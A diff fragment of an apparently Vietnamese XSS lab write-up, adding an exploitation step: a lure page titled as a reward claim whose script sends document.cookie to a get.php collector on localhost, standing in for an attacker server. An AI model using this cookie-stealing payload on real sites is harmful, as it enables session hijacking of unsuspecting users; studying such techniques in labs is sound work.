@@ -22,3 +22,19 @@ Thử thay giá trị ```Date()``` thành một mã lệnh khác như ```alert('
 
 ### Khai thác
 
+Tạo một url phishing cookie 
+```php
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Nhận phần thưởng</title>
+</head>
+<body>
+    <h1>Đang xử lý...</h1>
+    <script>
+    window.open("http://localhost/get.php?cookie=" + document.cookie);
+    </script>
+</body>
+</html>
+```
